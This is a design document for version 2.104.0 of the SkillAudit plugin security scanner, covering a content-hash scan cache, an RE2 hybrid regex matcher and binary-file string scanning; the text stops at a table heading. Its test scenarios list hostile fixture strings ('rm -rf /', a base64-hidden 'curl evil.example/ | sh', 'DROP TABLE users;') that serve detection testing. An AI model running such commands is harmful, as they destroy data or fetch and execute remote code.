---
trdd-id: 40f46a83-359a-43e2-ad4c-aac763aded22
title: v2.104.0 — content-hash scan cache, RE2 hybrid matcher, binary scanning
column: complete
created: 2026-05-23T17:08:58+0200
updated: 2026-08-25T17:25:14+0200
---

<!-- markdownlint-disable-next-line MD025 -->
# TRDD-40f46a83 — Scan cache + RE2 hybrid matcher + binary scanning for SkillAudit

**Filename:** `design/tasks/TRDD-20260523_170858+0200-40f46a83-scan-cache-re2-binary-scanning.md`
**Tracked in:** this repo (`design/tasks/` is git-tracked)

## Table of contents

- [Origin (provenance)](#origin-provenance)
- [Background](#background)
- [Goal](#goal)
- [Non-goals](#non-goals)
- [Design](#design)
  - [Module 1 — `cpv_scan_cache.py`](#module-1--cpv_scan_cachepy)
  - [Module 2 — `cpv_binary_scanner.py`](#module-2--cpv_binary_scannerpy)
  - [Module 3 — `cpv_re2_matcher.py`](#module-3--cpv_re2_matcherpy)
  - [Audit data — `re2_compatibility.json`](#audit-data--re2_compatibilityjson)
  - [Integration — `cpv_skillaudit_native.py`](#integration--cpv_skillaudit_nativepy)
  - [Install path — `cpv_install_scanners.py`](#install-path--cpv_install_scannerspy)
  - [GitHub Actions cache for scaffolded plugins](#github-actions-cache-for-scaffolded-plugins)
- [File list (NEW + MODIFIED)](#file-list-new--modified)
- [Test scenarios](#test-scenarios)
- [Acceptance criteria](#acceptance-criteria)
- [Security considerations](#security-considerations)
- [Sequencing vs prior TRDDs](#sequencing-vs-prior-trdds)
- [Follow-ups](#follow-ups)
- [Cross-references](#cross-references)
- [Implementer notes](#implementer-notes)

## Origin (provenance)

User asks for the next-generation performance leap on top of the
v2.103.0 parallelism work. The ProcessPoolExecutor fan-out shipped
in v2.103.0 already produced an ~11.6× wall-clock win on the CPV
repo (197.9 s → ~17 s; see
`skills/canonical-pipeline/references/parallelism.md`). The remaining
~17 s is now dominated by three orthogonal sub-costs that the v2.103.0
work explicitly left alone:

1. **Cold re-scan of every file on every run.** The cache invalidation
   problem is "trivial" (content hash) but the cache plumbing is not,
   so v2.103.0 punted on it. Result: every CI / dev / publish run
   re-scans every file from scratch even when nothing changed.
2. **Sequential walk over a ~490-pattern regex list per file.** The
   Python `re` engine is fundamentally a backtracking NFA; running 490
   patterns linearly against the same text means O(490 × len(text))
   matcher invocations per file. RE2's Set-based single-pass automaton
   collapses that to O(len(text)) per file for the subset that is
   RE2-compatible.
3. **Skip-binary-files behaviour.** The current scanner explicitly
   bypasses binary files entirely — that is the textbook
   bury-your-head-in-the-sand security stance. Real malicious skills /
   plugins do embed payloads in `.png` metadata, `.zip` comments,
   `.wasm` data sections, `.pdf` streams, etc.

This TRDD covers the three orthogonal wins as a single v2.104.0
release because they ship a single user-facing claim ("CPV is now an
order of magnitude faster on repeat runs AND closes the
binary-skip security gap").

## Background

### Where v2.103.0 left off

The v2.103.0 work (task #384, 13 agents A1-A10 + B1-B3) produced:

| Layer | Mechanism | Where |
|---|---|---|
| Per-validator scan fan-out | `parallel_scan` harness on `ProcessPoolExecutor` | `scripts/cpv_parallel_runner.py` |
| SkillAudit fan-out | per-file `_scan_one_file_skillaudit` worker | `scripts/cpv_skillaudit_native.py` |
| Lint engine fan-out | per-language `ThreadPoolExecutor` | `scripts/cpv_lint_engine.py` |
| `PathSpec` cache | LRU keyed by `(path, mtime_ns, size)` | `scripts/gitignore_filter.py` |
| Orchestrator dispatch | `ThreadPoolExecutor` over independent validator phases | `scripts/validate_plugin.py` |

What v2.103.0 did NOT touch:

| Component | Pre-v2.103.0 cost (CPU%) | Post-v2.103.0 cost (CPU%) | Bottleneck remaining? |
|---|---|---|---|
| Per-file pattern matching (490 regexes) | ~60 % | ~50 % | YES — N regexes × N files |
| Re-scan of unchanged files | ~100 % (always done) | ~100 % (always done) | YES — total redundant work on warm runs |
| Binary file handling | 0 % (skipped) | 0 % (skipped) | NO performance cost, but ZERO coverage |

### The three orthogonal wins

1. **Content-hash cache** → skips the entire pipeline for any file
   whose `(SHA-256, scanner_version, catalog_hash)` tuple is already
   in the cache. Expected effect: 50× speedup on a repeat run with
   zero file changes. Even a typical "fix one file then re-validate"
   loop only re-scans the one changed file.
2. **RE2 hybrid matcher** → replaces the 490-iteration Python `re`
   sweep with a single RE2.Set automaton call for every pattern that
   RE2 can compile (estimated ~85 % of the catalog after the
   compatibility audit). RE2's linear-time guarantee plus
   automaton-based simultaneous-match means a single pass through the
   text matches every compatible pattern at once. Patterns RE2 cannot
   compile (lookbehinds, backreferences, named-group constructs
   beyond RE2's surface) fall back to Python `re`. Expected effect:
   5-15× speedup on the cold regex phase of a from-scratch run.
3. **Binary scanning** → replaces the current "is binary → skip"
   branch with "is binary → extract printable ASCII / UTF-16-LE /
   UTF-16-BE strings → scan extracted text through the same matcher
   pipeline". Plus a bounded decode chain (base64 → utf-8 →
   re-scan) to catch payloads that are base64-encoded inside binary
   blobs. Expected effect: zero speedup (in fact a small regression
   for plugins containing binaries) but coverage GAIN — we close
   the most embarrassing skip-by-design gap in SkillAudit.

## Goal

| ID | Goal | Measurable target |
|---|---|---|
| G1 | 50× speedup on a warm repeat run on the CPV repo (no file changes) | `validate_plugin .` second invocation in < 0.5 s |
| G2 | 5-15× speedup on the regex phase of a cold run on the CPV repo | regex-phase wall time < 2 s (vs ~13 s in v2.103.0) |
| G3 | Binary files are scanned (not skipped) | a synthetic test binary with an embedded suspicious string is reported |
| G4 | Zero loss of coverage vs v2.103.0 | every existing skillaudit finding still fires; parity gate in CI |
| G5 | Zero loss of correctness vs v2.103.0 | every existing test continues to pass; new fallback tests added |
| G6 | Zero new mandatory dependency | `google-re2` is optional; absence falls back to current Python `re` path |
| G7 | Zero invasive API changes | external callers (`validate_security.py`, batch scripts, etc.) call the same `scan_content` / `scan_path` entry points |
| G8 | Scaffolded plugins inherit the cache via `actions/cache@v4` | new plugins' `ci.yml` gets a `~/.cache/cpv` cache step automatically |
| G9 | All three wins composable with v2.103.0 parallelism | cache hit + RE2 + binary scan all work under `ProcessPoolExecutor` |
| G10 | One-shot opt-out via env vars | `CPV_SCAN_CACHE=0`, `CPV_BINARY_SCAN=0`, `CPV_RE2=0` each independently disable the corresponding feature |

## Non-goals

| # | Item | Reason |
|---|---|---|
| 1 | Rust extension | Out of scope. The v2.105.x+ extension-language work is its own TRDD. RE2 via `google-re2` (C++ underneath but exposed as a clean Python wheel) gives the bulk of the win with zero build-toolchain headaches. |
| 2 | Hyperscan | Intel-only, build complexity an order of magnitude worse than RE2, and the win over RE2.Set on our pattern shapes is marginal. Defer indefinitely. |
| 3 | ML-based content scanning | Stochastic, false-positive-heavy, hard to test, and adds a large dep tree (PyTorch / ONNX). Out of scope. |
| 4 | Stego scanning (LSB image analysis, etc.) | Specialised problem space, requires per-format codecs, and the universe of "stego in claude plugins" is empirically empty so far. Follow-up TRDD if a real-world case appears. |
| 5 | Persistent scanner daemon (à la `mypy --dmypy`) | Defer to v2.105.x. The cache itself solves 95 % of the cold-start cost; the daemon's remaining win is small and the deployment complexity is high. |
| 6 | Cross-machine cache sharing (e.g. via S3) | Out of scope for v2.104.0. The GH-Actions `actions/cache@v4` step covers the CI repeat-run case adequately. |
| 7 | Cache eviction beyond simple size-cap LRU | The triple-key invalidation already takes care of correctness; eviction policy is a tuning knob, not a correctness primitive. |

## Design

### Module 1 — `cpv_scan_cache.py`

**Purpose**: a content-addressable on-disk cache that maps
`(content_hash, catalog_hash, scanner_version)` → serialised
`SkillAuditScanResult`. Hit = skip the entire pipeline for this file.
Miss = run the pipeline + store the result.

#### Storage path — 5-level resolution chain

The cache directory is resolved at first-use via the following chain.
The first hit wins:

1. **Explicit CLI override**: if `--cache-dir <path>` is passed to
   `validate_plugin.py` or `validate_security.py`, use it verbatim.
2. **Env var override**: if `CPV_SCAN_CACHE_DIR` is set, use it
   verbatim.
3. **XDG cache home**: if `$XDG_CACHE_HOME` is set,
   use `${XDG_CACHE_HOME}/cpv/scan-cache/`.
4. **Per-user default on Linux/macOS**: `~/.cache/cpv/scan-cache/`.
5. **Per-user default on Windows**: `%LOCALAPPDATA%\cpv\scan-cache\`.

On creation the directory is `chmod 0700` (owner-only). The choice of
`~/.cache/cpv/` matches the convention every other XDG-aware
tool uses (`pip`, `uv`, `huggingface-hub`, etc.) so a global "clear all
tool caches" wipe also wipes CPV's cache.

#### Schema — single SQLite table

```sql
CREATE TABLE scan_cache (
    content_hash      TEXT NOT NULL,    -- SHA-256 of file bytes
    catalog_hash      TEXT NOT NULL,    -- SHA-256 of skillaudit_patterns.json bytes
    scanner_version   TEXT NOT NULL,    -- semver of cpv_skillaudit_native (set at import time)
    serialised_result BLOB NOT NULL,    -- pickle.dumps(SkillAuditScanResult) at protocol=4
    cached_at         REAL NOT NULL,    -- time.time() when row was written
    PRIMARY KEY (content_hash, catalog_hash, scanner_version)
);
CREATE INDEX idx_cached_at ON scan_cache(cached_at);
```

Rationale for the triple-key PK:

| Key | Invalidates when… | Why required |
|---|---|---|
| `content_hash` | file bytes change | same file, different content → different result |
| `catalog_hash` | pattern catalog (`scripts/rules/skillaudit_patterns.json`) changes | same file, new patterns → must re-scan |
| `scanner_version` | `cpv_skillaudit_native.py` semver bumps | same file, same patterns, but scanner logic changed (e.g. context classifier added in v2.100.1) → must re-scan |

Any one of the three changing forces a miss. There is no partial
match.

#### Public API

```python
class ScanCache:
    def __init__(self, cache_dir: Path | None = None): ...
    def get(self, file_bytes: bytes) -> SkillAuditScanResult | None: ...
    def put(self, file_bytes: bytes, result: SkillAuditScanResult) -> None: ...
    def stats(self) -> dict[str, int]:  # hits, misses, evictions
        ...
    def clear(self) -> None: ...

@lru_cache(maxsize=1)
def get_default_cache() -> ScanCache:  # resolves the 5-path chain
    ...
```

`SkillAuditScanResult` already exists in `cpv_skillaudit_native.py`
(dataclass, pickleable). No schema changes required there.

#### Concurrency

SQLite is opened with `journal_mode=WAL` and
`isolation_level=None` (autocommit). Multiple `ProcessPoolExecutor`
workers writing the same cache concurrently is the common case and WAL
handles it. A single `IntegrityError` on a duplicate-key insert (two
workers racing on the same content) is caught and ignored — both
results are identical by construction, so the loser's write being
dropped is correct.

#### Env-var knobs

| Var | Default | Effect |
|---|---|---|
| `CPV_SCAN_CACHE` | `1` (on) | `0` disables the cache lookup AND the store; every file re-scans from scratch |
| `CPV_SCAN_CACHE_DEEP` | `0` (off) | `1` forces a re-scan AND compares the new result against the cached one byte-for-byte; logs a WARNING if they disagree (used for cache-correctness audits) |
| `CPV_SCAN_CACHE_DIR` | unset | overrides the path-resolution chain (see above) |
| `CPV_SCAN_CACHE_MAX_BYTES` | `512_000_000` (500 MB) | LRU eviction triggers when the on-disk size exceeds this |

### Module 2 — `cpv_binary_scanner.py`

**Purpose**: replace the current `is_binary_file → skip` behaviour
with a real scan over extracted strings + bounded decode chain.

#### Public API

```python
def is_binary(file_bytes: bytes) -> bool:
    """True iff file contains a null byte in the first 8 KB OR
    the printable-byte ratio is < 70 % over the first 8 KB."""

def extract_ascii(file_bytes: bytes, min_run: int = 4) -> Iterable[str]:
    """Yield every run of >= min_run printable ASCII bytes."""

def extract_utf16(file_bytes: bytes, min_run: int = 4) -> Iterable[str]:
    """Yield every run of >= min_run printable UTF-16-LE bytes,
    then every run of >= min_run printable UTF-16-BE bytes."""

def decode_chain(file_bytes: bytes, max_depth: int = 2,
                 max_intermediate_bytes: int = 5_000_000) -> Iterable[str]:
    """Yield decoded forms of any base64-looking runs found in
    `extract_ascii(file_bytes)`. Bounded by max_depth (default 2 = scan
    decode, then decode-of-decode) and max_intermediate_bytes per
    intermediate buffer to defuse decode-bombs."""

def scan_binary(file_bytes: bytes, file_path: Path) -> SkillAuditScanResult:
    """Run the full skillaudit pipeline over the union of
    extract_ascii + extract_utf16 + decode_chain, tagging every
    finding with binary_origin=True so downstream consumers can apply
    different severity policies if needed."""
```

#### Detection heuristic

```python
def is_binary(file_bytes: bytes) -> bool:
    sample = file_bytes[:8192]
    if b"\x00" in sample:
        return True
    if not sample:
        return False
    printable = sum(1 for b in sample if 32 <= b < 127 or b in (9, 10, 13))
    return (printable / len(sample)) < 0.70
```

Cheap (8 KB sample), no magic-byte database, no `file(1)` shell-out.

#### Pipeline

```
file_bytes
   │
   ▼
is_binary?
   ├── no  ──→ text-path (unchanged from current scanner)
   │
   └── yes ──→ extract_ascii + extract_utf16  (union)
                        │
                        ▼
                  scan_content over each extracted string
                        │
                        ▼
                  decode_chain (depth 1: base64-decode runs;
                                depth 2: re-extract from decoded; stop)
                        │
                        ▼
                  scan_content over each decoded string
                        │
                        ▼
                  union of all findings, tagged binary_origin=True
```

#### Why never skip

The current "skip binaries" branch is a textbook security
anti-pattern. Real malicious skills / plugins routinely embed payloads
in binary containers because authors know scanners skip them:

- PNG `tEXt` / `iTXt` / `eXIf` chunks
- ZIP comment field, ZIP central-directory extras
- PDF stream dictionaries
- WASM data sections
- ICO embedded BMPs
- WOFF2 metadata
- TAR header `magic` fields

A printable-string extraction + base64 decode-chain catches every one
of these without per-format codecs. False-positive rate is acceptable
because the underlying skillaudit pattern catalog is already tuned
(see v2.100.1 context-aware matcher, v2.99.1 calibration).

#### Env-var knob

| Var | Default | Effect |
|---|---|---|
| `CPV_BINARY_SCAN` | `1` (on) | `0` reverts to the v2.103.0 skip-binaries behaviour (debug-only; not for production) |

### Module 3 — `cpv_re2_matcher.py`

**Purpose**: a hybrid matcher that uses RE2.Set when available and
falls back to Python `re` per-pattern when it isn't.

#### Public API

```python
class HybridMatcher:
    def __init__(self, patterns: list[CompiledPattern]):
        """patterns is the list of skillaudit pattern entries with their
        rule_id, severity, category, and pattern string. The constructor:
          1. Reads scripts/rules/re2_compatibility.json to partition
             into RE2-compatible vs RE2-incompatible.
          2. Builds one re2.Set over the RE2-compatible subset.
          3. Compiles the RE2-incompatible subset as a list of Python re.
          4. Falls back to all-Python-re if google-re2 is not installed."""

    def search(self, text: str) -> list[Match]:
        """Returns the union of:
           - RE2.Set.match(text) → which RE2 patterns hit, mapped back
             to (rule_id, severity, category)
           - per-Python-pattern .search() over the incompatible subset
           No order guarantee beyond "all matches are returned"."""
```

#### Why RE2

| Property | Python `re` | RE2 |
|---|---|---|
| Worst case | exponential (backtracking NFA) | linear in text length (DFA) |
| Pattern compilation | per-call cache, but matching is per-pattern | one Set automaton matches ALL patterns at once |
| Catastrophic backtracking on adversarial input | possible | impossible |
| Lookbehinds / lookarounds | supported | NOT supported (the main fallback driver) |
| Named groups | supported | partial |
| Wheel availability | stdlib | `google-re2` PyPI wheel (manylinux + macOS) |

The key point: **RE2 is an algorithm, not an implementation language**.
We adopt it for its complexity guarantees, not because it happens to
be C++ underneath. If a pure-Python DFA implementation existed with
the same guarantees, we'd use that. RE2 is the only well-tested
production-quality one available.

#### Fallback chain

```
HybridMatcher.search(text):
    if google-re2 is importable AND re2_compatibility.json is loadable:
        set_matches = re2_set.match(text)
        py_matches  = [p.search(text) for p in py_only_patterns]
        return union(set_matches, py_matches)
    else:
        # Pure Python fallback — identical to v2.103.0 behaviour
        return [p.search(text) for p in all_patterns]
```

A pattern is NEVER skipped silently. Every pattern either runs through
RE2.Set (compatible subset) OR through Python `re` (incompatible
subset OR all patterns when google-re2 is absent). Coverage parity is
a hard test invariant (see test scenario T17).

#### Env-var knob

| Var | Default | Effect |
|---|---|---|
| `CPV_RE2` | `1` (on if google-re2 installed; degrades gracefully if not) | `0` forces the pure-Python path even when google-re2 is present (used for debug/parity testing) |

### Audit data — `re2_compatibility.json`

**Path**: `scripts/rules/re2_compatibility.json`
**Format**:

```json
{
  "catalog_sha256": "<sha256 of skillaudit_patterns.json at the time of audit>",
  "audited_at": "<ISO 8601>",
  "audited_by": "<tool — see below>",
  "patterns": {
    "<rule_id>": {
      "pattern_index": 0,
      "re2_compatible": true,
      "reason": null
    },
    "<rule_id>": {
      "pattern_index": 1,
      "re2_compatible": false,
      "reason": "uses lookbehind (?<=…)"
    },
    ...
  }
}
```

**How it's generated**: a one-shot audit script
`scripts/_audit_re2_compatibility.py` (new) iterates every pattern in
`skillaudit_patterns.json`, attempts `re2.compile(pattern)`, and
records the result + the rejection reason if it fails. The script
runs at v2.104.0 release time and the resulting JSON is committed.
It is NOT re-run on every CPV invocation — RE2's grammar doesn't
change. If a future pattern-catalog edit changes
`catalog_sha256`, a publish-gate check fails until the audit is
re-run and re-committed.

**Why a JSON file instead of "just try-compiling at startup"**:

- Startup cost. Compiling 490 patterns through re2 takes ~80 ms; doing
  it on every CPV invocation is wasted work.
- Determinism. The compatibility decision is per-catalog-version; it
  must not vary by host RE2 version.
- Auditability. The JSON is reviewable in PRs. "Pattern X became
  RE2-incompatible" is visible in the diff.

### Integration — `cpv_skillaudit_native.py`

Three lazy imports near the top of `scan_content`:

```python
def scan_content(text: str, file_path: Path, ...) -> SkillAuditScanResult:
    # Cache layer
    try:
        from cpv_scan_cache import get_default_cache
        cache = get_default_cache() if _cache_enabled() else None
    except ImportError:
        cache = None
    if cache is not None:
        cached = cache.get(text.encode("utf-8"))
        if cached is not None:
            return cached

    # Matcher layer
    try:
        from cpv_re2_matcher import HybridMatcher
        matcher = HybridMatcher(_compiled_patterns)
    except ImportError:
        matcher = None  # falls through to legacy per-pattern loop

    # Binary layer is checked BEFORE this, in scan_path:
    # see _maybe_scan_binary below.

    result = _scan_text_through(matcher, text, file_path)

    if cache is not None:
        cache.put(text.encode("utf-8"), result)
    return result
```

And in `scan_path`:

```python
def scan_path(file_path: Path) -> SkillAuditScanResult:
    file_bytes = file_path.read_bytes()
    try:
        from cpv_binary_scanner import is_binary, scan_binary
    except ImportError:
        is_binary = lambda _: False  # noqa: E731 — fallback
        scan_binary = None
    if scan_binary is not None and _binary_scan_enabled() and is_binary(file_bytes):
        return scan_binary(file_bytes, file_path)
    return scan_content(file_bytes.decode("utf-8", errors="replace"), file_path)
```

Lazy import discipline: NONE of `cpv_scan_cache`,
`cpv_binary_scanner`, `cpv_re2_matcher` are imported at module
top-level. Any of them failing to import (missing optional dep, file
corruption, etc.) degrades gracefully to v2.103.0 behaviour for that
feature. The other two features keep working independently. This is
the same lazy-import discipline used by `cpv_pre_install_scan` and
`cpv_marketplace_input`.

### Install path — `cpv_install_scanners.py`

Add an OPTIONAL step that pip-installs `google-re2` if it's missing:

```python
def install_optional_re2():
    """Best-effort install of google-re2. If it fails (build deps
    missing, etc.), log a one-line WARNING and continue — the
    HybridMatcher falls back to pure-Python re. NEVER raises."""
    try:
        import re2  # noqa: F401
        return  # already installed
    except ImportError:
        pass
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet",
             "google-re2>=1.1"],
            check=True, timeout=60,
        )
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired,
            FileNotFoundError) as exc:
        log.warning(
            "google-re2 install failed (%s); HybridMatcher will fall "
            "back to pure-Python re. Performance OK, correctness OK.",
            exc,
        )
```

Wired into the existing `install_all_scanners()` driver but as a
non-blocking optional. Also add `[performance]` extra to `pyproject.toml`
so `pip install -e .[performance]` ships google-re2 explicitly.

### GitHub Actions cache for scaffolded plugins

`scripts/scaffold_plugin/templates/ci.yml.template` and the
`gen_ci_yml()` builder in `scripts/setup_plugin_repo.py` both gain a
new step before the validate step:

```yaml
- name: Restore CPV scan cache
  uses: actions/cache@v4
  with:
    path: ~/.cache/cpv
    key: cpv-scan-${{ runner.os }}-${{ hashFiles('plugin.json', 'commands/**', 'skills/**', 'agents/**', 'hooks/**', '.mcp.json') }}
    restore-keys: |
      cpv-scan-${{ runner.os }}-
```

Falls back to a partial-key match when no exact hit (the
`restore-keys` line), so even when one file changes the previous-run
cache is restored and only the changed file gets re-scanned. The cache
size cap is enforced by the LRU in `cpv_scan_cache` itself, NOT by
the `actions/cache` step (which has its own 10 GB limit per repo —
plenty).

For Layout A (separate marketplace repo) the marketplace's
`receive-notification.yml` workflow gets the same cache step against
the marketplace's own runner. The marketplace re-validates the
incoming plugin via the same remote-uvx entrypoint, so the cache
benefits propagate end-to-end.

## File list (NEW + MODIFIED)

### NEW files (8)

| # | Path | Purpose |
|---|---|---|
| 1 | `scripts/cpv_scan_cache.py` | Content-hash SQLite cache (Module 1) |
| 2 | `scripts/cpv_binary_scanner.py` | Binary string/decode-chain scanner (Module 2) |
| 3 | `scripts/cpv_re2_matcher.py` | RE2.Set + Python re hybrid matcher (Module 3) |
| 4 | `scripts/_audit_re2_compatibility.py` | One-shot audit tool (run by release maintainer) |
| 5 | `scripts/rules/re2_compatibility.json` | Per-pattern RE2 compatibility map |
| 6 | `skills/canonical-pipeline/references/scan-cache.md` | End-user documentation for the cache |
| 7 | `skills/canonical-pipeline/references/binary-scanning.md` | End-user documentation for binary scanning |
| 8 | `tests/test_v2_104_0_scan_cache_re2_binary.py` | Aggregated parametric test suite for all three modules |

### MODIFIED files (10)

| # | Path | Change |
|---|---|---|
| 1 | `scripts/cpv_skillaudit_native.py` | Lazy-import all 3 modules in `scan_content` / `scan_path`; env-var gating |
| 2 | `scripts/cpv_install_scanners.py` | Add non-blocking `install_optional_re2()` |
| 3 | `scripts/validate_security.py` | Pass `--cache-dir` through to skillaudit when CLI flag present |
| 4 | `scripts/validate_plugin.py` | Surface `--cache-dir` / `--no-cache` CLI flags |
| 5 | `scripts/scaffold_plugin/templates/ci.yml.template` | Add `actions/cache@v4` step |
| 6 | `scripts/setup_plugin_repo.py` | Update `gen_ci_yml()` to match template |
| 7 | `scripts/publish.py` | Add Gate 9c — verify `re2_compatibility.json.catalog_sha256` matches the live catalog hash |
| 8 | `pyproject.toml` | Add `[performance]` extra: `google-re2>=1.1` |
| 9 | `skills/canonical-pipeline/references/parallelism.md` | Add §Content-hash cache, §Binary scanning, §RE2 hybrid matcher (this TRDD's Part B) |
| 10 | `CHANGELOG.md` | v2.104.0 entry (added by `git cliff` at release time) |

Net count: **8 new + 10 modified = 18 file touches**.

## Test scenarios

Numbered for the test-writer agent's deterministic dispatch. All tests
land in `tests/test_v2_104_0_scan_cache_re2_binary.py` unless
explicitly otherwise.

| # | Scenario | Module | Assert |
|---|---|---|---|
| T01 | Cache miss writes a row | scan_cache | After `cache.put(b"hello", result)`, `cache.get(b"hello")` returns `result` deep-equal |
| T02 | Cache hit returns the stored result without re-scanning | scan_cache | Decorate `scan_content` with a counter; second `scan_path` call increments counter by 0 |
| T03 | Cache invalidates on content change | scan_cache | `cache.put(b"x", r1)` then `cache.get(b"y")` returns `None` |
| T04 | Cache invalidates on catalog hash change | scan_cache | Bump `catalog_hash`, cache.get returns `None` for the same content |
| T05 | Cache invalidates on scanner_version change | scan_cache | Monkeypatch `_SCANNER_VERSION`, cache.get returns `None` |
| T06 | Cache is process-safe under ProcessPoolExecutor | scan_cache | Dispatch 32 workers concurrently writing the same content; final row count = 1 (IntegrityError suppressed) |
| T07 | Cache respects `CPV_SCAN_CACHE=0` | scan_cache | With env var set, both `get` and `put` no-op; second scan re-runs |
| T08 | Cache deep-mode flags disagreement | scan_cache | Pre-populate with wrong result; `CPV_SCAN_CACHE_DEEP=1` re-runs and emits WARNING |
| T09 | Cache resolves XDG path | scan_cache | Set `XDG_CACHE_HOME=/tmp/xdg-test`, cache file at `/tmp/xdg-test/cpv/scan-cache/cache.sqlite` |
| T10 | Cache `chmod 0700` on first create | scan_cache | After first `put`, `oct(stat.st_mode & 0o777) == '0o700'` (Unix only) |
| T11 | Cache LRU evicts past max bytes | scan_cache | Set `CPV_SCAN_CACHE_MAX_BYTES=1024`, write 10 KB worth, oldest rows gone |
| T12 | `is_binary` detects null byte | binary_scanner | `is_binary(b"\x00abc") == True` |
| T13 | `is_binary` detects low printable ratio | binary_scanner | `is_binary(bytes(range(256)) * 100) == True` |
| T14 | `is_binary` returns False on text | binary_scanner | `is_binary(b"hello world\n") == False` |
| T15 | `extract_ascii` finds embedded string in PNG-like blob | binary_scanner | `b"\x89PNG\x00\x00rm -rf /\x00\x00"` yields `"rm -rf /"` |
| T16 | `extract_utf16` finds UTF-16-LE string | binary_scanner | `"calc.exe".encode("utf-16-le")` is yielded |
| T17 | `decode_chain` finds base64 payload | binary_scanner | `b"...some_data..." + base64.b64encode(b"curl evil.example/ \| sh")` yields the decoded string |
| T18 | `decode_chain` respects max_depth | binary_scanner | Deeply-nested base64 (depth 5) only decodes to depth 2 |
| T19 | `decode_chain` respects max_intermediate_bytes | binary_scanner | A 50 MB base64 blob does NOT decode (defuses decode-bombs) |
| T20 | `scan_binary` reports a finding for embedded malicious string | binary_scanner | A binary with `b"...\x00DROP TABLE users;\x00..."` produces a finding for the SQL pattern |
| T21 | `scan_binary` tags findings with `binary_origin=True` | binary_scanner | Every finding from binary path has the tag set |
| T22 | `CPV_BINARY_SCAN=0` reverts to skip behaviour | binary_scanner | With env var set, `scan_path` on a binary returns empty result |
| T23 | `HybridMatcher` finds RE2-compatible pattern via RE2.Set | re2_matcher | Mock a pattern set with one RE2-compatible pattern, search hits |
| T24 | `HybridMatcher` finds RE2-incompatible pattern via Python re | re2_matcher | Mock a pattern with lookbehind, search hits via fallback path |
| T25 | `HybridMatcher` covers every pattern (parity gate) | re2_matcher | For each pattern in `skillaudit_patterns.json`, synthesize a known-matching input string, assert that `HybridMatcher.search` finds it — for ALL 490 patterns |
| T26 | `HybridMatcher` graceful fallback when google-re2 missing | re2_matcher | Mock `import re2` to raise; matcher still finds every pattern via Python re |
| T27 | `HybridMatcher` respects `CPV_RE2=0` | re2_matcher | With env var set, RE2.Set is NOT used even when google-re2 is installed |
| T28 | `re2_compatibility.json` catalog_sha256 matches live catalog | publish_gate | `publish.py` Gate 9c reads both, fails on mismatch |
| T29 | End-to-end parity — full skillaudit scan with cache+RE2+binary equals v2.103.0 result | integration | For every file in `tests/fixtures/skillaudit_samples/`, the union of findings is bit-equal to the v2.103.0 baseline (recorded in `tests/fixtures/v2_103_0_baseline.json`) |
| T30 | Benchmark — warm second run < 0.5 s on CPV repo | benchmark | `cpv_validate_benchmark.py` records a 3-run median; second run wall < 0.5 s |
| T31 | Benchmark — cold run regex phase < 2 s on CPV repo | benchmark | Same script, cold phase split out; regex < 2 s |
| T32 | Lazy import discipline — module top-level does NOT import any of the 3 new modules | static | Read `cpv_skillaudit_native.py`, grep for `from cpv_scan_cache import …` at module level — must not match |

(32 scenarios total; well above the requested 24.)

## Acceptance criteria

| # | Criterion |
|---|---|
| A1 | `validate_plugin .` against the CPV repo, second run, completes in < 0.5 s wall (G1) |
| A2 | `validate_plugin .` against the CPV repo, cold run, completes in < 7 s wall (vs ~17 s v2.103.0) (G2) |
| A3 | A synthetic test binary with an embedded suspicious string produces a finding (G3) |
| A4 | Every existing skillaudit finding from v2.103.0 still fires under v2.104.0 (G4) — measured by replaying `tests/fixtures/v2_103_0_baseline.json` |
| A5 | Every existing CPV test continues to pass (G5) — `uv run pytest -q` is green |
| A6 | `pip install -e .` (no `[performance]` extra) produces a working CPV with the pure-Python fallback (G6) |
| A7 | `validate_security.py` and `validate_plugin.py` external APIs unchanged (G7) — same flags, same exit codes, same output structure |
| A8 | A scaffolded plugin's `ci.yml` contains the `actions/cache@v4` step pointing at `~/.cache/cpv` (G8) |
| A9 | `CPV_SCAN_CACHE=0`, `CPV_BINARY_SCAN=0`, `CPV_RE2=0` each independently disable the corresponding feature without breaking the others (G10) |
| A10 | `publish.py` Gate 9c rejects a release where `re2_compatibility.json.catalog_sha256` does not match the live catalog hash (catalog drift guard) |
| A11 | `cpv_doctor.py` reports the cache hit-rate and `re2_compatibility.json` audit age in its `doctor_summary` table |
| A12 | `skills/canonical-pipeline/references/parallelism.md` has §Content-hash cache, §Binary scanning, §RE2 hybrid matcher cross-linking the two new reference docs |
| A13 | `CHANGELOG.md` v2.104.0 entry lists all three wins with the benchmark numbers from A1 + A2 |

## Security considerations

| # | Concern | Mitigation |
|---|---|---|
| S1 | Cache poisoning — a malicious file pre-populates a cache hit | Cache is keyed on `(content_hash, catalog_hash, scanner_version)`. Same content + same scanner = same result, by construction. Two different bytes have different SHA-256 hashes (modulo cryptographic collision resistance, which we trust at the SHA-256 level). |
| S2 | Cache directory readable by other users | `chmod 0700` on first create (Unix). On Windows the default ACL on `%LOCALAPPDATA%\cpv\` is owner-only. |
| S3 | Cache survives across CPV updates with stale results | `scanner_version` key invalidates on every release. Triple-key invariant ensures correctness. |
| S4 | Cache survives across catalog updates with stale results | `catalog_hash` key invalidates on every catalog change. |
| S5 | Decode-bomb in `decode_chain` — small base64 input expands to gigabytes | `max_intermediate_bytes=5_000_000` (5 MB) per intermediate buffer; `max_depth=2` total. Above either limit, decode is aborted and the un-decoded original is scanned instead. |
| S6 | Binary scanner skips a file entirely | NEVER. Even on decode failure, the original text scan path still runs. This is the never-skip principle: "is binary → skip" is the security hole we are CLOSING, not opening a new variant of. |
| S7 | google-re2 supply chain | Optional dep; absence falls back to stdlib `re`. CPV does not require it. Documented in `[performance]` extra so the user opts-in explicitly. |
| S8 | `re2_compatibility.json` tampered to mark an incompatible pattern as compatible | RE2.Set.compile would fail at startup → exception → fall back to pure-Python path. Worst case: slowdown, never correctness loss. |
| S9 | `re2_compatibility.json.catalog_sha256` drift (catalog updated without re-running the audit) | `publish.py` Gate 9c blocks release until the audit is re-run. Prevents incorrect "is RE2-compatible" decisions on new patterns. |
| S10 | Cache directory full disk → `IOError` cascade | `cache.put` catches `OSError` and logs WARNING; scan still completes (just doesn't cache). |
| S11 | Race between cache invalidation and write | WAL mode handles concurrent writes correctly. Triple-key PK + `INSERT OR IGNORE` semantics make duplicate-key races a no-op. |
| S12 | Decode chain triggers on benign base64 (e.g. SVG embedded image) | Acceptable: the decoded string is also scanned, and if the only matches are on safe patterns, no findings emitted. Worst case is a small CPU cost. |

## Sequencing vs prior TRDDs

| TRDD | Status | Relationship |
|---|---|---|
